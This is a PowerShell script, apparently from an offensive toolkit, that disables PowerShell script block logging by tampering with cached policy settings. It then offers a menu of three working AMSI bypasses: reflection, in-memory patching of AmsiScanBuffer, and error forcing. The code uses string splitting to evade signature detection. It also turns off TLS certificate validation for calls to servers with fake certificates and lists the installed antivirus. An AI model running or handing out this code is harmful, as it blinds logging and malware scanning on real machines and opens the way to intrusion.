try
{
        Write-host " "
        $pathk = "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Scr"+"iptB"+"lockLo"+"gging"

	    $value = Get-ItemProperty -Path $pathk -ErrorAction Stop | Select-Object -ExpandProperty 'EnableScriptBlockLogging' -ErrorAction Stop
	    if($value -ne 1)
        {
            throw "Script block logging not enabled"
        }
        Write-host "Script block logging enabled"
        Write-host " "
        Write-host "Running script block logging bypass"
        $settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'] = @{}
        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Scr'+'iptB'+'lockLo'+'gging'].Add('EnableScriptBlockLogging',"0")
        [Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))

        write-host " "
        write-host "Test ScriptBlockLogging"

        $log = Get-WinEvent -filterhashtable @{logname="Microsoft-Windows-PowerShell/Operational";id=4104} -erroraction 'silentlycontinue' | Where {$_.Message -like "*Test ScriptBlockLogging*"}
        if($log -eq $null)
        {							
	        Write-host " "
	        Write-host "Script block logging bypass executed successfully"
        }
        else
        {							
	        Write-host " "
	        Write-host "Error executing Script block logging bypass. Exit "
            return
        }

}
catch 
{
	    Write-host "Script block logging not enabled"
}


function AV-Bypass-Setup
<#
.SYNOPSIS
	PowerShell AMSI Bypass.
	Resources:
	  - @_xpn_ => https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/
.DESCRIPTION
	Author: @b4rtic
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.EXAMPLE
	C:\PS> AV-Bypass-Setup
#>
{ 
	Write-host ""
	Write-host "AMSI evasion technique: "
	Write-host ""
	Write-host "1 Reflection "
	Write-host "2 Patching"
	Write-host "3 Error Forcing"
	Write-host ""
	
    $menuevcmd = Read-Host -Prompt 'Set evasion option'
	
	switch($menuevcmd)
	{
			1 {
				
				#@mattifestation
				
				Write-host " "
				Write-host "Running Reflection method"
				[Ref].Assembly.GetType('System.M'+'ana'+'gement.Automation.A'+'msi'+'Uti'+'ls').GetField('ams'+'iIni'+'tFa'+'iled','NonPublic,Static').SetValue($null,$true)
			}
			2 {
                		
				#@Tal_Liberman's Patching method
				
				Write-host " "
				Write-host "Running Patching method"
$win32 = @"
using System.Runtime.InteropServices;
using System;
public class Win32 {
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@;

				Add-Type $win32
				$ptr = [Win32]::GetProcAddress([Win32]::LoadLibrary('a'+'ms'+'i.dll'), 'Am'+'si'+'Sc'+'an'+'Bu'+'ffer')
				$b = 0
				[Win32]::VirtualProtect($ptr, [UInt32]5, 0x40, [Ref]$b)
				$buf = New-Object Byte[] 7
				$buf[0] = 0x66; $buf[1] = 0xb8; $buf[2] = 0x01; $buf[3] = 0x00; $buf[4] = 0xc2; $buf[5] = 0x18; $buf[6] = 0x00;
				[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 7)			
			}
          	      3 {
                
				#@_xpn_'s Error forcing method
				
				Write-host " "
				Write-host "Running Error forcing method"
						$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)
				[Ref].Assembly.GetType("System.Management.Automation.A"+"msi"+"Uti"+"ls").GetField('am'+'siS'+'ess'+'ion',"NonPublic,Static").SetValue($null, $null);
				[Ref].Assembly.GetType("System.Management.Automation.Am"+"s"+"iU"+"tils").GetField('a'+'msiC'+'ont'+'ext',"NonPublic,Static").SetValue($null, [IntPtr]$mem)			
			}
		      4 {
				Write-host " "
				Write-host "No evasion method"		
			}
		default {return}
	}
	
    #Needed for https call with fake cert
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true} ;

}

function Get-AVStatus {
 
	Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
}

Write-host ""
Write-host "Localhost AV Status"
Get-AVStatus
AV-Bypass-Setup
